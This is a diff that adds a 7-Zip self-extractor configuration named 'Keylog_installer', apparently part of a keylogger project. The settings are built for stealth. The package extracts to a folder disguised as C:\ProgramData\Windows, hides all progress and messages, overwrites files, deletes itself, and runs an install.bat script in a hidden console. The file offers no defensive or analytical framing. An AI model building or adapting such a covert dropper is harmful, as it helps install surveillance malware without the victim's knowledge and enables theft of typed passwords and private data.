@@ -1,0 +1,43 @@
+<?xml version="1.0"?>
+<Settings>
+  <General>
+    <ExtractMode Path="C:\ProgramData\Windows" AllowEdit="False">Custom</ExtractMode>
+    <HideProgress>True</HideProgress>
+    <ProgressDisableCancel>False</ProgressDisableCancel>
+    <SelfDelete>True</SelfDelete>
+    <CompressStub>True</CompressStub>
+    <XPStyles>False</XPStyles>
+    <HideTitleIcon>True</HideTitleIcon>
+    <PromptShowSFXIcon>False</PromptShowSFXIcon>
+    <Overwrite>All</Overwrite>
+    <MessageBegin Show="False">Start extraction</MessageBegin>
+    <MessageCancel Show="False">Are you sure you want to cancel?</MessageCancel>
+    <MessageFinish Show="False">Files were successfully extracted</MessageFinish>
+    <TitleText>Keylog_installer</TitleText>
+    <ExtractPathText>Select extraction path</ExtractPathText>
+    <ExtractCancelText>Abort</ExtractCancelText>
+    <ExtractDialogText />
+    <ExtractTitleText>Extracting</ExtractTitleText>
+    <ExtractShowIcon>False</ExtractShowIcon>
+    <ProgressPercent>0</ProgressPercent>
+    <ProgressShowIcon>False</ProgressShowIcon>
+    <Icon>F:\Softwares\Tools\7-Zip SFX Maker\Resources\01.ico</Icon>
+  </General>
+  <Tasks>
+    <Item Enabled="True">RunProgram="hidcon:\"%%T\\tmp\\install.bat\""</Item>
+  </Tasks>
+  <VersionString>
+    <Item Name="Comments" Value="" Enabled="False" />
+    <Item Name="CompanyName" Value="Oleg N. Scherbakov" Enabled="False" />
+    <Item Name="FileDescription" Value="7z Setup SFX" Enabled="False" />
+    <Item Name="FileVersion" Value="1, 2, 0, 715" Enabled="False" />
+    <Item Name="InternalName" Value="7zSfxNew" Enabled="False" />
+    <Item Name="LegalCopyright" Value="Copyright © 2005-2007 Oleg N. Scherbakov" Enabled="False" />
+    <Item Name="LegalTrademarks" Value="" Enabled="False" />
+    <Item Name="OriginalFilename" Value="7zSfxNew.exe" Enabled="False" />
+    <Item Name="PrivateBuild" Value="July 14, 2007" Enabled="False" />
+    <Item Name="ProductName" Value="7ZSfxNew" Enabled="False" />
+    <Item Name="ProductVersion" Value="1, 2, 0, 715" Enabled="False" />
+    <Item Name="SpecialBuild" Value="" Enabled="False" />
+  </VersionString>
+</Settings>
